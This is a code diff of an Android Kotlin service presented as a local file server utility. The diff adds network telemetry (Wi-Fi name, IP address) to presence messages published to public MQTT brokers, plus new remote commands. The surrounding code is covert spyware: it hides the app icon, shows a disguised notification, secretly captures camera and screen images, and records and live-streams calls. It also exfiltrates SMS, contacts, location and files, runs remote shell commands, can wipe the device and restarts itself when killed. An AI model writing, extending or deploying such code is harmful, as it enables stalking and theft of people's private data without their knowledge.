@@ -1,4 +1,6 @@
-package com.example.localutility
+﻿package com.example.localutility
+
+
 
 
 import android.app.AlarmManager
@@ -55,7 +57,11 @@ import java.io.File
 import javax.net.ssl.SSLSocketFactory
 
 
+
+
 class LocalFileServerService : Service() {
+
+
 
 
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
@@ -72,6 +78,8 @@ class LocalFileServerService : Service() {
     private lateinit var stealthCaptureManager: StealthCaptureManager
 
 
+
+
     companion object {
         private const val PORT = 8888
         private const val NOTIFICATION_ID = 1
@@ -80,6 +88,8 @@ class LocalFileServerService : Service() {
         var isCloudConnected: Boolean = false
         var onCloudStatusChanged: ((Boolean) -> Unit)? = null
         var instance: LocalFileServerService? = null
+
+
 
 
         // Phase 6 & 7: Account & Multi-Device Global State with Secret PIN
@@ -92,11 +102,15 @@ class LocalFileServerService : Service() {
     }
 
 
+
+
     private val batteryReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context, intent: Intent) {
             broadcastBatteryStatus()
         }
     }
+
+
 
 
     override fun onCreate() {
@@ -106,10 +120,14 @@ class LocalFileServerService : Service() {
         currentPairingCode = prefs.getString("pairing_code", currentPairingCode) ?: currentPairingCode
 
 
+
+
         // Phase 7: Deterministic permanent hardware-backed Device ID (never duplicates across reinstalls/rebinds)
         val androidId = try {
             Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: ""
         } catch (_: Exception) { "" }
+
+
 
 
         val cleanHardwareId = if (androidId.isNotEmpty() && androidId != "9774d56d682e549c") {
@@ -130,9 +148,13 @@ class LocalFileServerService : Service() {
         }
 
 
+
+
         baseDir = getExternalFilesDir(null) ?: filesDir
         createNotificationChannel()
         registerReceiver(batteryReceiver, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
+
+
 
 
         try {
@@ -147,13 +169,19 @@ class LocalFileServerService : Service() {
         }
 
 
+
+
         teleManager = TelephonyAndLocationManager(applicationContext)
         teleManager.onLocationUpdated = { locJson ->
             broadcastMessage(locJson.toString())
         }
 
 
+
+
                 stealthCaptureManager = StealthCaptureManager(applicationContext)
+
+
 
 
         val callRecorder = CallRecordingManager.getInstance(applicationContext)
@@ -178,9 +206,13 @@ class LocalFileServerService : Service() {
         }
 
 
+
+
         startMqttWorker()
         initCloudBridge()
     }
+
+
 
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -196,6 +228,8 @@ class LocalFileServerService : Service() {
         startServer()
         return START_STICKY
     }
+
+
 
 
     override fun onTaskRemoved(rootIntent: Intent?) {
@@ -224,6 +258,8 @@ class LocalFileServerService : Service() {
     }
 
 
+
+
     private fun startForegroundService() {
         try {
             // Stealth & Disguised notification: No pairing code or OpenDroid branding shown
@@ -239,6 +275,8 @@ class LocalFileServerService : Service() {
                 .build()
 
 
+
+
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                 startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
             } else {
@@ -252,6 +290,8 @@ class LocalFileServerService : Service() {
     }
 
 
+
+
     private fun startMqttWorker() {
         serviceScope.launch {
             for (msg in mqttSendChannel) {
@@ -260,6 +300,8 @@ class LocalFileServerService : Service() {
                         val mqttMsg = MqttMessage(msg.toByteArray()).apply { qos = 1 }
                         // Always publish to guest pairing code channel
                         mqttClient?.publish("opendroid/$currentPairingCode/pc", mqttMsg)
+
+
 
 
                         // If bound to account, also publish to multi-device account channel
@@ -273,6 +315,8 @@ class LocalFileServerService : Service() {
             }
         }
     }
+
+
 
 
         // --- 7-Server Multi-Broker Cascade Pool (Resilient Auto-Failover) ---
@@ -290,6 +334,8 @@ class LocalFileServerService : Service() {
     private var activeBrokerIndex = 0
 
 
+
+
     private fun initCloudBridge(brokerIdx: Int = 0) {
         serviceScope.launch {
             val safeIdx = brokerIdx % EMQX_BROKERS.size
@@ -300,13 +346,19 @@ class LocalFileServerService : Service() {
                 val clientId = "OpenDroidPhone_" + System.currentTimeMillis()
 
 
+
+
                 try {
                     mqttClient?.disconnectForcibly(1000, 1000)
                     mqttClient?.close()
                 } catch (_: Exception) {}
 
 
+
+
                 mqttClient = MqttClient(brokerUrl, clientId, MemoryPersistence())
+
+
 
 
                 val options = MqttConnectOptions().apply {
@@ -337,6 +389,8 @@ class LocalFileServerService : Service() {
                 }
 
 
+
+
                 mqttClient?.setCallback(object : MqttCallbackExtended {
                     override fun connectComplete(reconnect: Boolean, serverURI: String?) {
                         Log.d("CloudBridge", "Connected to Broker [$activeBrokerIndex]: $serverURI")
@@ -350,6 +404,8 @@ class LocalFileServerService : Service() {
                     }
 
 
+
+
                     override fun connectionLost(cause: Throwable?) {
                         Log.w("CloudBridge", "Connection lost on [$activeBrokerIndex] $brokerUrl. Auto-cascading to next server...", cause)
                         isCloudConnected = false
@@ -361,6 +417,8 @@ class LocalFileServerService : Service() {
                             initCloudBridge(activeBrokerIndex + 1)
                         }
                     }
+
+
 
 
                     override fun messageArrived(topic: String?, message: MqttMessage?) {
@@ -382,8 +440,12 @@ class LocalFileServerService : Service() {
                     }
 
 
+
+
                     override fun deliveryComplete(token: IMqttDeliveryToken?) {}
                 })
+
+
 
 
                 mqttClient?.connect(options)
@@ -412,6 +474,8 @@ class LocalFileServerService : Service() {
     }
 
 
+
+
     private fun subscribeToCode(code: String) {
         try {
             mqttClient?.subscribe("opendroid/$code/phone", 1)
@@ -422,12 +486,16 @@ class LocalFileServerService : Service() {
     }
 
 
+
+
     // --- Phase 6: Central Account & Multi-Device Hub Engine ---
     fun bindAccount(email: String, pin: String, name: String) {
         bindAccountInternal(email, pin, name)
         subscribeToAccountChannels()
         publishDevicePresence(true)
     }
+
+
 
 
     fun unbindAccount() {
@@ -445,10 +513,14 @@ class LocalFileServerService : Service() {
     }
 
 
+
+
     private fun bindAccountInternal(email: String, pin: String, name: String) {
         boundAccountEmail = email.trim().lowercase()
         boundAccountPin = pin.trim()
         deviceNickname = if (name.trim().isEmpty()) (Build.MODEL ?: "Android Device") else name.trim()
+
+
 
 
         // Cryptographic SHA-256 salted accountTag derived from email + secret PIN
@@ -459,6 +531,8 @@ class LocalFileServerService : Service() {
         accountTag = "acc_" + hash.take(16)
         Log.d("OpenDroid", "Bound account: $boundAccountEmail [PIN Protected] -> Tag: $accountTag | Device: $openDroidDeviceId ($deviceNickname)")
     }
+
+
 
 
     private fun subscribeToAccountChannels() {
@@ -475,7 +549,11 @@ class LocalFileServerService : Service() {
     }
 
 
+
+
     private var heartbeatJob: kotlinx.coroutines.Job? = null
+
+
 
 
     private fun startPresenceHeartbeat() {
@@ -491,13 +569,74 @@ class LocalFileServerService : Service() {
     }
 
 
+
+
+
+    private fun getNetworkTelemetry(): Triple<String, String, String> {
+        return try {
+            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? android.net.ConnectivityManager
+            var netType = "Unknown"
+            var wifiSsid = ""
+            var ipAddress = ""
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                val activeNet = cm?.activeNetwork
+                val caps = cm?.getNetworkCapabilities(activeNet)
+                if (caps != null) {
+                    when {
+                        caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) -> {
+                            netType = "Wi-Fi"
+                            try {
+                                val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as? android.net.wifi.WifiManager
+                                val info = wm?.connectionInfo
+                                val ssid = info?.ssid?.replace(""", "") ?: ""
+                                if (ssid.isNotEmpty() && ssid != "<unknown ssid>") {
+                                    wifiSsid = ssid
+                                }
+                            } catch (_: Exception) {}
+                        }
+                        caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) -> {
+                            netType = "Cellular (5G/LTE)"
+                        }
+                        caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_ETHERNET) -> {
+                            netType = "Ethernet"
+                        }
+                        else -> netType = "Connected"
+                    }
+                } else {
+                    netType = "Offline"
+                }
+            }
+
+            try {
+                val interfaces = java.net.NetworkInterface.getNetworkInterfaces()
+                while (interfaces.hasMoreElements()) {
+                    val networkInterface = interfaces.nextElement()
+                    val addresses = networkInterface.inetAddresses
+                    while (addresses.hasMoreElements()) {
+                        val inetAddress = addresses.nextElement()
+                        if (!inetAddress.isLoopbackAddress && inetAddress is java.net.Inet4Address) {
+                            ipAddress = inetAddress.hostAddress ?: ""
+                            break
+                        }
+                    }
+                    if (ipAddress.isNotEmpty()) break
+                }
+            } catch (_: Exception) {}
+
+            Triple(netType, wifiSsid, ipAddress)
+        } catch (_: Exception) {
+            Triple("Unknown", "", "")
+        }
+    }
+
     private fun publishDevicePresence(isOnline: Boolean) {
         if (mqttClient?.isConnected != true || accountTag.isEmpty() || openDroidDeviceId.isEmpty()) return
         try {
             val bm = getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
             val batteryLevel = bm?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: 50
             val isCharging = bm?.isCharging ?: false
-
+            val (netType, wifiSsid, ipAddress) = getNetworkTelemetry()
 
             val presenceJson = JSONObject().apply {
                 put("deviceId", openDroidDeviceId)
@@ -505,12 +644,15 @@ class LocalFileServerService : Service() {
                 put("deviceName", deviceNickname)
                 put("model", Build.MODEL ?: "Android Device")
                 put("manufacturer", Build.MANUFACTURER ?: "Android")
+                put("osVersion", "Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
                 put("battery", batteryLevel)
                 put("isCharging", isCharging)
                 put("isOnline", isOnline)
+                put("networkType", netType)
+                put("wifiSsid", wifiSsid)
+                put("ipAddress", ipAddress)
                 put("timestamp", System.currentTimeMillis())
             }
-
 
             val topic = "opendroid/acc/$accountTag/devices/$openDroidDeviceId/presence"
             val msg = MqttMessage(presenceJson.toString().toByteArray()).apply {
@@ -518,11 +660,13 @@ class LocalFileServerService : Service() {
                 isRetained = true // Retained message so web client gets latest state immediately
             }
             mqttClient?.publish(topic, msg)
-            Log.d("OpenDroid", "Published presence heartbeat for $openDroidDeviceId (online=$isOnline)")
+            Log.d("OpenDroid", "Published presence heartbeat for $openDroidDeviceId (online=$isOnline, net=$netType, ip=$ipAddress)")
         } catch (e: Exception) {
             Log.e("OpenDroid", "Error publishing presence", e)
         }
     }
+
+
 
 
     private fun sendFullSyncData() {
@@ -568,6 +712,8 @@ class LocalFileServerService : Service() {
     }
 
 
+
+
     private fun broadcastBatteryStatus() {
         try {
             val batteryStatus: Intent? = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
@@ -611,10 +757,14 @@ class LocalFileServerService : Service() {
     }
 
 
+
+
     fun broadcastMessage(msg: String) {
         wsMessageChannel.trySend(msg)
         mqttSendChannel.trySend(msg)
     }
+
+
 
 
     private fun sendStealthCaptureResult(target: String, base64Data: String?, error: String?) {
@@ -628,8 +778,12 @@ class LocalFileServerService : Service() {
         val jsonStr = response.toString()
 
 
+
+
         // 1. Send to local WebSocket clients
         wsMessageChannel.trySend(jsonStr)
+
+
 
 
         // 2. Direct send to Cloud MQTT with QoS 0 (avoids Paho QoS 1 buffer overflow on large image payloads)
@@ -648,6 +802,8 @@ class LocalFileServerService : Service() {
             }
         }
     }
+
+
 
 
     fun setStealthMode(hideIcon: Boolean): Boolean {
@@ -669,6 +825,8 @@ class LocalFileServerService : Service() {
     }
 
 
+
+
     fun isStealthModeActive(): Boolean {
         return try {
             val pm = packageManager
@@ -681,11 +839,15 @@ class LocalFileServerService : Service() {
     }
 
 
+
+
     fun sendDirectCameraFrame(base64Frame: String) {
         val json = JSONObject().apply {
             put("type", "CAMERA_FRAME")
             put("frame", base64Frame)
         }.toString()
+
+
 
 
         wsMessageChannel.trySend(json)
@@ -703,11 +865,15 @@ class LocalFileServerService : Service() {
     }
 
 
+
+
     fun sendDirectScreenFrame(base64Frame: String) {
         val json = JSONObject().apply {
             put("type", "SCREEN_FRAME")
             put("frame", base64Frame)
         }.toString()
+
+
 
 
         wsMessageChannel.trySend(json)
@@ -725,11 +891,15 @@ class LocalFileServerService : Service() {
     }
 
 
+
+
     fun sendDirectAudioChunk(base64Pcm: String) {
         val json = JSONObject().apply {
             put("type", "AUDIO_CHUNK")
             put("data", base64Pcm)
         }.toString()
+
+
 
 
         wsMessageChannel.trySend(json)
@@ -747,10 +917,14 @@ class LocalFileServerService : Service() {
     }
 
 
+
+
     private fun handleIncomingJson(json: JSONObject) {
         val cameraStreamer = DirectCameraStreamer.getInstance(applicationContext)
         val screenStreamer = DirectScreenStreamer.getInstance(applicationContext)
         val audioStreamer = AudioStreamManager.getInstance(applicationContext)
+
+
 
 
         when (json.optString("type")) {
@@ -765,10 +939,32 @@ class LocalFileServerService : Service() {
         }
 
 
+
+
         when (json.optString("action")) {
+            "PING_FLEET", "GET_DEVICE_TELEMETRY" -> {
+                publishDevicePresence(true)
+            }
+
+            "UPDATE_DEVICE_NICKNAME" -> {
+                val newName = json.optString("name", "").trim()
+                if (newName.isNotEmpty()) {
+                    deviceNickname = newName
+                    getSharedPreferences("opendroid_prefs", Context.MODE_PRIVATE)
+                        .edit().putString("device_name", newName).apply()
+                    publishDevicePresence(true)
+                    broadcastMessage(JSONObject().apply {
+                        put("type", "NICKNAME_UPDATED")
+                        put("name", newName)
+                    }.toString())
+                }
+            }
+
             "HANDSHAKE" -> {
                 sendFullSyncData()
             }
+
+
 
 
             // --- Step 1.1: Remote URL Launcher ---
@@ -781,10 +977,14 @@ class LocalFileServerService : Service() {
                         } else rawUrl
 
 
+
+
                         val browserIntent = Intent(Intent.ACTION_VIEW, Uri.parse(formattedUrl)).apply {
                             flags = Intent.FLAG_ACTIVITY_NEW_TASK
                         }
                         applicationContext.startActivity(browserIntent)
+
+
 
 
                         broadcastMessage(JSONObject().apply {
@@ -806,6 +1006,8 @@ class LocalFileServerService : Service() {
             }
 
 
+
+
             // --- Phase 1: Step 1.2 Remote App Management (Launch & Uninstall) ---
             "LAUNCH_APP" -> {
                 val pkg = json.optString("package", "").trim()
@@ -818,6 +1020,8 @@ class LocalFileServerService : Service() {
             }
 
 
+
+
             "UNINSTALL_APP" -> {
                 val pkg = json.optString("package", "").trim()
                 RemoteInputService.isAutoUninstallArmed = true
@@ -828,6 +1032,8 @@ class LocalFileServerService : Service() {
                     put("success", success)
                 }.toString())
             }
+
+
 
 
             // --- Phase 5: Remote APK Installer (Using Secure FileProvider) ---
@@ -870,12 +1076,16 @@ class LocalFileServerService : Service() {
             }
 
 
+
+
             // =========================================================================
             // Phase 2: Stealth Photo / Screenshot Capture (Direct QoS 0 Dispatch)
             // =========================================================================
             "STEALTH_CAPTURE" -> {
                 val target = json.optString("target", "FRONT").uppercase() // "FRONT", "BACK", "SCREEN"
                 Log.d("StealthCapture", "Received STEALTH_CAPTURE request for target: $target")
+
+
 
 
                 when (target) {
@@ -886,11 +1096,15 @@ class LocalFileServerService : Service() {
                     }
 
 
+
+
                     "FRONT" -> {
                         stealthCaptureManager.captureCamera(isFront = true) { base64Jpeg, error ->
                             sendStealthCaptureResult("FRONT", base64Jpeg, error)
                         }
                     }
+
+
 
 
                     "BACK" -> {
@@ -900,11 +1114,15 @@ class LocalFileServerService : Service() {
                     }
 
 
+
+
                     else -> {
                         sendStealthCaptureResult(target, null, "Invalid capture target: $target")
                     }
                 }
             }
+
+
 
 
             // --- Camera Stream ---
@@ -915,8 +1133,12 @@ class LocalFileServerService : Service() {
                 }
 
 
+
+
                 val facing = json.optString("facing", "back")
                 val isFront = (facing == "front")
+
+
 
 
                 val camServiceIntent = Intent(this@LocalFileServerService, CameraStreamService::class.java).apply {
@@ -929,6 +1151,8 @@ class LocalFileServerService : Service() {
                 }
 
 
+
+
                 cameraStreamer.startStreaming(isFront) { frameBase64 ->
                     sendDirectCameraFrame(frameBase64)
                 }
@@ -936,6 +1160,8 @@ class LocalFileServerService : Service() {
                     put("type", "CAMERA_STREAM_STARTED")
                 }.toString())
             }
+
+
 
 
             "STOP_CAMERA_STREAM" -> {
@@ -948,6 +1174,8 @@ class LocalFileServerService : Service() {
             }
 
 
+
+
             // --- Phase 1: Step 1.3 Standalone Flashlight / Torch Toggle ---
             "TOGGLE_STANDALONE_TORCH" -> {
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
@@ -958,6 +1186,8 @@ class LocalFileServerService : Service() {
                             characteristics.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true &&
                             characteristics.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK
                         } ?: cameraManager.cameraIdList.firstOrNull()
+
+
 
 
                         if (cameraId != null) {
@@ -992,8 +1222,12 @@ class LocalFileServerService : Service() {
             }
 
 
+
+
             "SWITCH_CAMERA" -> cameraStreamer.switchCamera()
             "TOGGLE_FLASHLIGHT" -> cameraStreamer.toggleTorch()
+
+
 
 
             // --- Screen Mirror Stream ---
@@ -1004,6 +1238,8 @@ class LocalFileServerService : Service() {
                     stopService(camServiceIntent)
                     broadcastMessage(JSONObject().put("type", "CAMERA_STREAM_STOPPED").toString())
                 }
+
+
 
 
                 if (screenStreamer.isStreaming) {
@@ -1023,12 +1259,16 @@ class LocalFileServerService : Service() {
             }
 
 
+
+
             "STOP_SCREEN_STREAM" -> {
                 screenStreamer.pauseStreaming()
                 broadcastMessage(JSONObject().apply {
                     put("type", "SCREEN_STREAM_STOPPED")
                 }.toString())
             }
+
+
 
 
             // --- Phase 5: Notification History Center ---
@@ -1041,12 +1281,16 @@ class LocalFileServerService : Service() {
             }
 
 
+
+
             "CLEAR_NOTIF_HISTORY" -> {
                 NotificationMirrorService.instance?.clearNotificationHistory()
                 broadcastMessage(JSONObject().apply {
                     put("type", "NOTIF_HISTORY_CLEARED")
                 }.toString())
             }
+
+
 
 
             // --- Ambient Audio & Call Audio Sync ---
@@ -1069,6 +1313,8 @@ class LocalFileServerService : Service() {
             }
 
 
+
+
             "STOP_AUDIO_STREAM" -> {
                 val callRecorder = CallRecordingManager.getInstance(applicationContext)
                 callRecorder.setLiveListening(false)
@@ -1079,10 +1325,14 @@ class LocalFileServerService : Service() {
             }
 
 
+
+
             // --- Phase 19: Dual-Engine Call Recording & Live Audio Stream ---
             "FETCH_CALL_RECORDINGS" -> {
                 broadcastCallRecordingsList()
             }
+
+
 
 
             "DELETE_CALL_RECORDING" -> {
@@ -1094,6 +1344,8 @@ class LocalFileServerService : Service() {
                     broadcastCallRecordingsList()
                 }
             }
+
+
 
 
             "PLAY_CALL_RECORDING", "FETCH_CALL_RECORDING_AUDIO", "GET_CALL_RECORDING_BASE64" -> {
@@ -1119,6 +1371,8 @@ class LocalFileServerService : Service() {
             }
 
 
+
+
             "START_CALL_LISTEN", "LISTEN_CALL_LIVE" -> {
                 val callRecorder = CallRecordingManager.getInstance(applicationContext)
                 callRecorder.setLiveListening(true)
@@ -1126,6 +1380,8 @@ class LocalFileServerService : Service() {
                     put("type", "CALL_LISTEN_STARTED")
                 }.toString())
             }
+
+
 
 
             "STOP_CALL_LISTEN" -> {
@@ -1137,6 +1393,8 @@ class LocalFileServerService : Service() {
             }
 
 
+
+
             // --- Phase 3: Two-Way Audio (Walkie-Talkie Playback) ---
             "WALKIE_TALKIE_CHUNK" -> {
                 val data = json.optString("data")
@@ -1146,9 +1404,13 @@ class LocalFileServerService : Service() {
             }
 
 
+
+
             "STOP_WALKIE_TALKIE" -> {
                 audioStreamer.stopWalkieTalkie()
             }
+
+
 
 
             // --- Notifications ---
@@ -1162,6 +1424,8 @@ class LocalFileServerService : Service() {
                     put("success", success)
                 }.toString())
             }
+
+
 
 
             // --- Device Administrator (Remote Screen Lock) ---
@@ -1195,6 +1459,8 @@ class LocalFileServerService : Service() {
             }
 
 
+
+
             // --- Phase 5: Remote Emergency Device Wipe ---
             "WIPE_DEVICE" -> {
                 try {
@@ -1226,6 +1492,8 @@ class LocalFileServerService : Service() {
             }
 
 
+
+
             // --- Phase 2: Step 2.3 Stealth Mode (Hide Launcher Icon) ---
             "SET_STEALTH_MODE" -> {
                 val hideIcon = json.optBoolean("hideIcon", false)
@@ -1238,6 +1506,8 @@ class LocalFileServerService : Service() {
             }
 
 
+
+
             "GET_STEALTH_MODE" -> {
                 val isHidden = isStealthModeActive()
                 broadcastMessage(JSONObject().apply {
@@ -1245,6 +1515,8 @@ class LocalFileServerService : Service() {
                     put("hideIcon", isHidden)
                 }.toString())
             }
+
+
 
 
             "LAUNCH_OPEN_DROID" -> {
@@ -1267,12 +1539,16 @@ class LocalFileServerService : Service() {
             }
 
 
+
+
             // --- Remote Touch Gesture (Accessibility) ---
             "INPUT_TAP" -> {
                 val xNorm = json.optDouble("x", 0.0).toFloat()
                 val yNorm = json.optDouble("y", 0.0).toFloat()
                 RemoteInputService.instance?.dispatchTap(xNorm, yNorm)
             }
+
+
 
 
             "INPUT_SWIPE" -> {
@@ -1284,11 +1560,15 @@ class LocalFileServerService : Service() {
             }
 
 
+
+
             // --- Remote Touch / Gesture / Global Actions ---
             "INPUT_GLOBAL", "GLOBAL_ACTION" -> {
                 val globalAction = if (json.has("actionType")) json.getString("actionType") else json.optString("globalAction", "")
                 RemoteInputService.instance?.executeGlobalAction(globalAction)
             }
+
+
 
 
             // --- Telephony & SMS Actions ---
@@ -1298,6 +1578,8 @@ class LocalFileServerService : Service() {
                     teleManager.makeCall(number)
                 }
             }
+
+
 
 
             "SEND_SMS" -> {
@@ -1311,9 +1593,13 @@ class LocalFileServerService : Service() {
             }
 
 
+
+
             // --- Audio Ring / Alarm / Siren ---
             "RING_SIREN", "PLAY_ALARM" -> playRingtone()
             "STOP_SIREN", "STOP_ALARM" -> stopRingtone()
+
+
 
 
             // --- General Fetch Actions Requested by WebOS ---
@@ -1325,12 +1611,16 @@ class LocalFileServerService : Service() {
             }
 
 
+
+
             "FETCH_AUDIO" -> {
                 broadcastMessage(JSONObject().apply {
                     put("type", "AUDIO_TRACKS_LIST")
                     put("data", teleManager.getAudioTracks())
                 }.toString())
             }
+
+
 
 
             "FETCH_VIDEOS" -> {
@@ -1341,12 +1631,16 @@ class LocalFileServerService : Service() {
             }
 
 
+
+
             "FETCH_PHOTOS" -> {
                 broadcastMessage(JSONObject().apply {
                     put("type", "PHOTOS_LIST")
                     put("data", teleManager.getRecentPhotos())
                 }.toString())
             }
+
+
 
 
             "FETCH_DIR" -> {
@@ -1356,6 +1650,8 @@ class LocalFileServerService : Service() {
                     put("data", teleManager.getDirectoryContents(path))
                 }.toString())
             }
+
+
 
 
             // --- Phase 4: Advanced File Operations ---
@@ -1369,6 +1665,8 @@ class LocalFileServerService : Service() {
                     put("path", path)
                 }.toString())
             }
+
+
 
 
             "RENAME_FILE" -> {
@@ -1385,6 +1683,8 @@ class LocalFileServerService : Service() {
             }
 
 
+
+
             "CREATE_FOLDER" -> {
                 val parentPath = json.optString("parentPath", "")
                 val folderName = json.optString("folderName", "")
@@ -1397,6 +1697,7 @@ class LocalFileServerService : Service() {
                     put("folderName", folderName)
                 }.toString())
             }
+
 
             "COPY_FILE" -> {
                 val sourcePath = json.optString("sourcePath", "")
@@ -1411,6 +1712,7 @@ class LocalFileServerService : Service() {
                 }.toString())
             }
 
+
             "MOVE_FILE" -> {
                 val sourcePath = json.optString("sourcePath", "")
                 val destDirPath = json.optString("destDirPath", "")
@@ -1424,6 +1726,7 @@ class LocalFileServerService : Service() {
                 }.toString())
             }
 
+
             "GET_FILE_INFO" -> {
                 val path = json.optString("path", "")
                 val details = teleManager.getFileOrFolderDetails(path)
@@ -1432,6 +1735,7 @@ class LocalFileServerService : Service() {
                     put("data", details)
                 }.toString())
             }
+
 
             "BATCH_DELETE" -> {
                 val pathsArray = json.optJSONArray("paths") ?: org.json.JSONArray()
@@ -1446,6 +1750,8 @@ class LocalFileServerService : Service() {
                     put("result", result)
                 }.toString())
             }
+
+
 
 
             "ZIP_AND_DOWNLOAD" -> {
@@ -1476,6 +1782,8 @@ class LocalFileServerService : Service() {
             }
 
 
+
+
             "FETCH_CALL_LOGS" -> {
                 val offset = json.optInt("offset", 0)
                 val limit = json.optInt("limit", 100)
@@ -1491,12 +1799,16 @@ class LocalFileServerService : Service() {
             }
 
 
+
+
             "FETCH_SMS" -> {
                 broadcastMessage(JSONObject().apply {
                     put("type", "SMS_LIST")
                     put("data", teleManager.getRecentSms())
                 }.toString())
             }
+
+
 
 
             "FETCH_CONTACTS" -> {
@@ -1512,6 +1824,7 @@ class LocalFileServerService : Service() {
                     put("hasMore", paged.getBoolean("hasMore"))
                 }.toString())
             }
+
 
             "DELETE_CALL_LOG" -> {
                 val id = if (json.has("id")) json.optLong("id", -1L) else -1L
@@ -1529,6 +1842,7 @@ class LocalFileServerService : Service() {
                 }.toString())
             }
 
+
             "CLEAR_CALL_LOGS" -> {
                 teleManager.clearCallLogs()
                 broadcastMessage(JSONObject().apply {
@@ -1540,6 +1854,7 @@ class LocalFileServerService : Service() {
                     put("hasMore", false)
                 }.toString())
             }
+
 
             "ADD_CONTACT" -> {
                 val name = json.optString("name", "")
@@ -1559,6 +1874,7 @@ class LocalFileServerService : Service() {
                 }.toString())
             }
 
+
             "DELETE_CONTACT" -> {
                 val id = if (json.has("id")) json.optLong("id", -1L) else -1L
                 val number = json.optString("number", "")
@@ -1575,6 +1891,8 @@ class LocalFileServerService : Service() {
             }
 
 
+
+
             "FETCH_STORAGE" -> {
                 broadcastMessage(JSONObject().apply {
                     put("type", "STORAGE_STATS")
@@ -1583,9 +1901,13 @@ class LocalFileServerService : Service() {
             }
 
 
+
+
             "FETCH_LOCATION" -> {
                 broadcastMessage(teleManager.getLocation().toString())
             }
+
+
 
 
             "FETCH_CLIPBOARD" -> {
@@ -1594,6 +1916,8 @@ class LocalFileServerService : Service() {
                     put("text", teleManager.getClipboardText())
                 }.toString())
             }
+
+
 
 
             "SET_CLIPBOARD" -> {
@@ -1606,6 +1930,8 @@ class LocalFileServerService : Service() {
             }
 
 
+
+
             // --- Chunked File Transfer ---
             "DOWNLOAD_FILE_CHUNK" -> {
                 val path = json.optString("path", "")
@@ -1616,6 +1942,8 @@ class LocalFileServerService : Service() {
                     put("data", chunkObj)
                 }.toString())
             }
+
+
 
 
             // --- Phase 20: Remote Web Terminal & Shell Runner ---
@@ -1635,6 +1963,7 @@ class LocalFileServerService : Service() {
                             return@launch
                         }
 
+
                         val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
                         var stdout = ""
                         var stderr = ""
@@ -1646,10 +1975,12 @@ class LocalFileServerService : Service() {
                             process.waitFor()
                         }
 
+
                         val exitCode = exited ?: run {
                             process.destroyForcibly()
                             -1
                         }
+
 
                         val combinedOutput = when {
                             exited == null -> "$stdout\n[TIMEOUT ]: Command exceeded 15s limit and was terminated."
@@ -1658,6 +1989,7 @@ class LocalFileServerService : Service() {
                             stdout.isNotEmpty() -> stdout
                             else -> "[Process exited with code $exitCode]"
                         }
+
 
                         val res = JSONObject().apply {
                             put("type", "SHELL_OUTPUT")
@@ -1679,6 +2011,7 @@ class LocalFileServerService : Service() {
                     }
                 }
             }
+
 
             // --- Phase 21: 1-Click APK Extractor & Backup ---
             "EXTRACT_APK" -> {
@@ -1716,6 +2049,7 @@ class LocalFileServerService : Service() {
                 }
             }
 
+
             "UPLOAD_FILE_CHUNK" -> {
                 val fileName = json.optString("fileName", "")
                 val targetPath = json.optString("targetPath", "")
@@ -1737,6 +2071,8 @@ class LocalFileServerService : Service() {
             }
         }
     }
+
+
 
 
         private fun broadcastCallRecordingsList() {
@@ -1766,6 +2102,8 @@ class LocalFileServerService : Service() {
     }
 
 
+
+
     private fun playRingtone() {
         try {
             stopRingtone()
@@ -1774,8 +2112,12 @@ class LocalFileServerService : Service() {
             audioManager.setStreamVolume(AudioManager.STREAM_ALARM, maxVol, 0)
 
 
+
+
             val alert: Uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
                 ?: RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
+
+
 
 
             currentRingtone = RingtoneManager.getRingtone(applicationContext, alert).apply {
@@ -1791,6 +2133,8 @@ class LocalFileServerService : Service() {
     }
 
 
+
+
     private fun stopRingtone() {
         try {
             currentRingtone?.stop()
@@ -1801,9 +2145,13 @@ class LocalFileServerService : Service() {
     }
 
 
+
+
     private fun startServer() {
         if (isServerStartingOrRunning) return
         isServerStartingOrRunning = true
+
+
 
 
         serviceScope.launch {
@@ -1817,6 +2165,8 @@ class LocalFileServerService : Service() {
             }
         }
     }
+
+
 
 
     private fun createNotificationChannel() {
@@ -1838,9 +2188,13 @@ class LocalFileServerService : Service() {
     }
 
 
+
+
     override fun onDestroy() {
         super.onDestroy()
         unregisterReceiver(batteryReceiver)
+
+
 
 
         // Immortal Self-Healing Watchdog: Auto-restart service if killed or dismissed
@@ -1881,11 +2235,17 @@ class LocalFileServerService : Service() {
     }
 
 
+
+
     override fun onBind(intent: Intent?): IBinder? = null
+
+
 
 
     private fun Application.fileServerModule(directory: File) {
         install(WebSockets)
+
+
 
 
         routing {
@@ -1899,6 +2259,8 @@ class LocalFileServerService : Service() {
             }
 
 
+
+
             get("/api/files") {
                 val files = directory.listFiles()?.map {
                     JSONObject().put("name", it.name).put("size", it.length()).put("isDirectory", it.isDirectory)
@@ -1907,12 +2269,16 @@ class LocalFileServerService : Service() {
             }
 
 
+
+
                         get("/api/call_recordings") {
                 val files = CallRecordingManager.getInstance(applicationContext).getRecordedCalls().map {
                     JSONObject().put("name", it.name).put("size", it.length()).put("modified", it.lastModified())
                 }
                 call.respondText(JSONArray(files).toString(), ContentType.Application.Json)
             }
+
+
 
 
             get("/api/call_recordings/{name}") {
@@ -1924,6 +2290,8 @@ class LocalFileServerService : Service() {
